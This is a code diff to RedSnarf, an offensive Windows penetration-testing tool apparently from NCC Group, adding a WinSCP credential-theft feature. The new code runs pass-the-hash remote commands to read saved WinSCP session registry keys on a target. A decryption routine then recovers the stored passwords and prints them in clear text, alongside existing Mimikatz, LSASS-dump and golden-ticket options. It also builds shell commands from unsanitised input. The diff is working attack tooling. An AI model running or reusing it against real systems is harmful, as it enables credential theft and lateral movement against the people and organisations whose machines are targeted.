@@ -74,6 +74,46 @@ def banner():
 	print colored("\nE D Williams - NCCGroup",'red')
 	print colored("R Davy - NCCGroup\n",'red')
 
+class Decrypter:
+	SIMPLE_STRING = "0123456789ABCDEF"
+	SIMPLE_MAGIC = 0xA3
+
+	def __init__(self, password):
+		self.data = password
+
+	def next(self):
+		a = self.SIMPLE_STRING.index(self.data[0])
+		b = self.SIMPLE_STRING.index(self.data[1])
+		result = ~(((a << 4) + b) ^ self.SIMPLE_MAGIC) % 256
+		self.discard(2)
+		return result
+
+	def discard(self, n=2):
+		self.data = self.data[n:]
+
+def decrypt(hostname, username, password):
+	FLAG_SIMPLE = 0xFF
+
+	decrypter = Decrypter(password)
+
+	flag = decrypter.next()
+	if flag == FLAG_SIMPLE:
+		decrypter.discard(2)
+		length = decrypter.next()
+	else:
+		length = flag
+
+	offset = decrypter.next()
+	decrypter.discard(offset*2)
+
+	result = "".join([chr(decrypter.next()) for i in range(length)])
+
+	key = username + hostname
+	if flag == FLAG_SIMPLE and result.startswith(key):
+		return result[len(key):]
+
+	return result
+
 
 #Code for Password Policy Retrievel
 #source: https://github.com/Wh1t3Fox/polenum
@@ -1555,7 +1595,7 @@ def main():
 					print colored ("[+]Found " + find_user + " logged in to "+str(ip),'green')
 
 banner()
-p = argparse.ArgumentParser("./redsnarf -H ip=192.168.0.1 -u administrator -p Password1", version="RedSnarf Version 0.3h", formatter_class=lambda prog: argparse.HelpFormatter(prog,max_help_position=20,width=150),description = "Offers a rich set of features to help Pentest Servers and Workstations")
+p = argparse.ArgumentParser("./redsnarf -H ip=192.168.0.1 -u administrator -p Password1", version="RedSnarf Version 0.3i", formatter_class=lambda prog: argparse.HelpFormatter(prog,max_help_position=20,width=150),description = "Offers a rich set of features to help Pentest Servers and Workstations")
 
 # Creds
 p.add_argument("-H", "--host", dest="host", help="Specify a hostname -H ip= / range -H range= / targets file -H file= to grab hashes from")
@@ -1595,6 +1635,7 @@ hgroup.add_argument("-hL", "--lsass_dump", dest="lsass_dump", default="n", help=
 hgroup.add_argument("-hM", "--massmimi_dump", dest="massmimi_dump", default="n", help="<Optional> Mimikatz Dump Credentaisl from the remote machine(s)")
 hgroup.add_argument("-hR", "--stealth_mimi", dest="stealth_mimi", default="n", help="<Optional> stealth version of mass-mimikatz")
 hgroup.add_argument("-hT", "--golden_ticket", dest="golden_ticket", default="n", help="<Optional> Create a Golden Ticket")
+hgroup.add_argument("-hW", "--win_scp", dest="win_scp", default="n", help="<Optional> Check for, and decrypt WinSCP hashes")
 # Enumeration related
 egroup = p.add_argument_group('Enumeration related')
 egroup.add_argument("-eA", "--service_accounts", dest="service_accounts", default="n", help="<Optional> Enum service accounts, if any")
@@ -1672,6 +1713,7 @@ mssqlshell=args.mssqlshell
 wifi_credentials=args.wifi_credentials
 john_to_pipal=args.john_to_pipal
 get_spn=args.get_spn
+win_scp=args.win_scp
 
 #Code takes a hash file which has previously been seen by Jtr, cuts out the cracked passwords, gets rid of any blank lines, gets rid of the last line, outputs to a tmp file
 #in the tmp directory. Runs pipal against the tmp file and then pipes out the pipal data to file.
@@ -1726,6 +1768,57 @@ elif remotetargets[0:6]=='range=':
 		
 	for remotetarget in IPNetwork(remotetargets[6:len(remotetargets)]):
 		targets.append (remotetarget);
+
+if win_scp!='n':
+	if len(targets)==1:
+		try:				
+			print colored("[+]Getting WinSCP Sessions:",'green')
+			proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall \/\/"+targets[0]+" 'cmd /C reg.exe query \"HKCU\Software\Martin Prikryl\WinSCP 2\Sessions\" ' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
+			scp_sessions = proc.communicate()[0]
+			
+			if "The system was unable to find the specified registry key or value." in scp_sessions:
+				print colored("[-]No sessions found...",'red')
+				sys.exit()	
+
+			print colored("[+]The following WinSCP Sessions Were Found:",'green')
+			k=scp_sessions.splitlines()
+			for session in k:
+				if len(session)>0:
+					print colored("[+]"+session[60:],'yellow')
+
+			response = raw_input("Enter the name of the session you would like to try and recover details for:")
+			if response !="":
+				
+				proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall \/\/"+targets[0]+" 'cmd /C reg.exe query \"HKCU\Software\Martin Prikryl\WinSCP 2\Sessions\\"+response+"\""" /v \"HostName\"' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
+				scp_host = proc.communicate()[0]	
+			
+				proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall \/\/"+targets[0]+" 'cmd /C reg.exe query \"HKCU\Software\Martin Prikryl\WinSCP 2\Sessions\\"+response+"\""" /v \"Username\"' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
+				scp_username = proc.communicate()[0]	
+
+				proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall \/\/"+targets[0]+" 'cmd /C reg.exe query \"HKCU\Software\Martin Prikryl\WinSCP 2\Sessions\\"+response+"\""" /v \"Password\"' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
+				scp_password = proc.communicate()[0]	
+
+				if len(scp_host) and len(scp_username) and len(scp_password)==4:
+					print colored("[-]No details were found that could be used:",'red')
+					sys.exit()
+								
+				password = decrypt(scp_host.split('REG_SZ')[1].lstrip().rstrip(), scp_username.split('REG_SZ')[1].lstrip().rstrip(), scp_password.split('REG_SZ')[1].lstrip().rstrip())
+
+				if password!="":
+					print colored("[+]Decrypted WinSCP Details are:",'green')
+					print colored("[+]Host: "+scp_host.split('REG_SZ')[1].lstrip().rstrip(),'yellow')
+					print colored("[+]Username: "+scp_username.split('REG_SZ')[1].lstrip().rstrip(),'yellow')
+					print colored("[+]Password: "+password,'yellow')
+
+			sys.exit()	
+			
+		except OSError:
+				print colored("[-]Something went wrong whilst using the WinSCP Option...",'red')
+				logging.error("[-]Something went wrong whilst using the WinSCP Option")
+				sys.exit()	
+	else:
+		print colored ('\n[-]It is only possible to use this technique on a single target and not a range','red')
+		sys.exit()
 
 if get_spn in yesanswers or get_spn=="l":
 	if len(targets)==1:
